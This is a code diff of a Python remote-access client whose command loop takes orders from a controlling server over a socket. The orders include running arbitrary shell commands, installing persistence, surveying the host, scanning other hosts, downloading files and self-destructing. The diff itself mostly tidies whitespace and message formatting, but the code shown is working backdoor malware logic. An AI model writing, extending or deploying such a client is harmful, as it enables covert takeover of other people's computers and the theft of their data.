@@ -10,7 +10,7 @@ import subprocess
 import sys
 import time
 
-from core import persistence, scan, survey, toolkit
+from core import *
 
 
 # change these to suit your needs
@@ -34,48 +34,48 @@ else:
 def client_loop(conn):
     while True:
         results = ''
-        
+
         # wait to receive data from server
         data = conn.recv(4096)
-    
+
         # seperate data into command and action
         cmd, _, action = data.partition(' ')
-    
+
         if cmd == 'execute':
             results = subprocess.Popen(action, shell=True,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       stdin=subprocess.PIPE)
-            results = results.stdout.read() + results.stderr.read() + \
-                      '\n"{}" completed.'.format(action)
-        
+            results = results.stdout.read() + results.stderr.read()
+
         elif cmd == 'kill':
             conn.close()
             sys.exit(0)
-    
+
         elif cmd == 'goodbye':
             conn.shutdown(socket.SHUT_RDWR)
             conn.close()
             break
-    
+
         elif cmd == 'persistence':
             results = persistence.run(PLAT)
-    
+
         elif cmd == 'scan':
             results = scan.single_host(action)
-    
+
         elif cmd == 'survey':
             results = survey.run(PLAT)
-    
+
         elif cmd == 'unzip':
             results = toolkit.unzip(action)
-    
+
         elif cmd == 'wget':
             results = toolkit.wget(action)
-    
+
         elif cmd == 'selfdestruct':
             conn.close()
             toolkit.selfdestruct(PLAT)
-    
+
+        results += '\n{} completed.'.format(cmd)
         conn.send(results)
 
 
@@ -89,7 +89,7 @@ def main():
             time.sleep(CONN_TIMEOUT)
             continue
         # conn.setblocking(0)
-    
+
         client_loop(conn)
 
 
